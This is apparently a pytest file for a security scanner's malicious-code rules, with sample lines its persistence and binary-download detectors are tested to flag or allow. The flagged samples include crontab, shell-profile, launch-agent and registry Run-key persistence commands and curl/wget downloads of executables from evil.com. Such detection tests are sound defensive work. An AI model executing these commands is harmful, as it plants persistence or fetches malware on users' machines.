"""Tests for malicious code persistence and binary rules (EXEC-004, EXEC-005)."""

from __future__ import annotations

from pathlib import Path

import pytest

from skill_scan.models import Rule, Severity
from skill_scan.rules.loader import load_rules
from tests.unit.rule_helpers import match_rule, rule_findings

RULES_PATH = (
    Path(__file__).resolve().parents[2] / "src" / "skill_scan" / "rules" / "data" / "malicious_code.toml"
)


@pytest.fixture(scope="module")
def rules() -> list[Rule]:
    """Load malicious code rules once for the module."""
    return load_rules(RULES_PATH)


class TestExec004Persistence:
    """Tests for EXEC-004 -- Persistence mechanism detection."""

    @pytest.mark.parametrize(
        "line",
        [
            "crontab -e",
            "crontab -r",
            'echo "* * * * * /tmp/evil" | crontab -i',
            "write to ~/Library/LaunchAgents/com.evil.plist",
            "cp payload ~/Library/LaunchDaemons/evil.plist",
            "systemctl enable evil-service",
            "systemctl daemon-reload",
            'echo "export PATH=/evil" >> ~/.bashrc',
            'echo "alias sudo=evil" >> ~/.zshrc',
            'echo "source /tmp/evil" >> ~/.profile',
            'echo "payload" >> $HOME/.bash_profile',
            "copy to \\Start Menu\\Programs\\Startup folder",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil",
        ],
    )
    def test_detects_persistence(self, rules: list[Rule], line: str) -> None:
        findings = rule_findings(line, rules, "EXEC-004")
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert findings[0].category == "malicious-code"

    @pytest.mark.parametrize(
        "line",
        [
            "check your crontab for existing jobs",
            "view crontab entries to audit schedules",
            "list crontab to see scheduled tasks",
            "cat ~/.bashrc to review your config",
            "read your .bashrc for PATH settings",
            "inspect your .bashrc before making changes",
            "Use systemd for service management",
            "The crontab format uses five fields",
        ],
    )
    def test_allows_safe_content(self, rules: list[Rule], line: str) -> None:
        assert not match_rule(line, rules, "EXEC-004")


class TestExec005BinaryDownloads:
    """Tests for EXEC-005 -- Binary download instruction detection."""

    @pytest.mark.parametrize(
        "line",
        [
            "Download setup.exe from https://evil.com",
            "curl https://evil.com/payload.exe -o installer.exe",
            "wget https://evil.com/trojan.exe",
            "Download installer.dmg from the link below",
            "curl https://evil.com/payload.dmg -o app.dmg",
            "wget https://evil.com/backdoor.dmg",
            "Download package.pkg from the server",
            "curl https://evil.com/setup.pkg -o setup.pkg",
            "wget https://evil.com/install.pkg",
            "unzip -P s3cret archive.zip",
            "unzip -P password protected_files.zip",
        ],
    )
    def test_detects_binary_downloads(self, rules: list[Rule], line: str) -> None:
        findings = rule_findings(line, rules, "EXEC-005")
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH

    @pytest.mark.parametrize(
        "line",
        [
            "Warning: never download unknown .exe files",
            "security risk: .exe files from untrusted sources",
            "avoid downloading .exe from unknown sources",
            "do not download .exe files from email links",
            "Warning: .dmg files can contain malware",
            ".exe files are Windows executable binaries",
            "Use pip install instead of downloading packages",
            "unzip archive.zip -d output/",
        ],
    )
    def test_allows_safe_content(self, rules: list[Rule], line: str) -> None:
        assert not match_rule(line, rules, "EXEC-005")
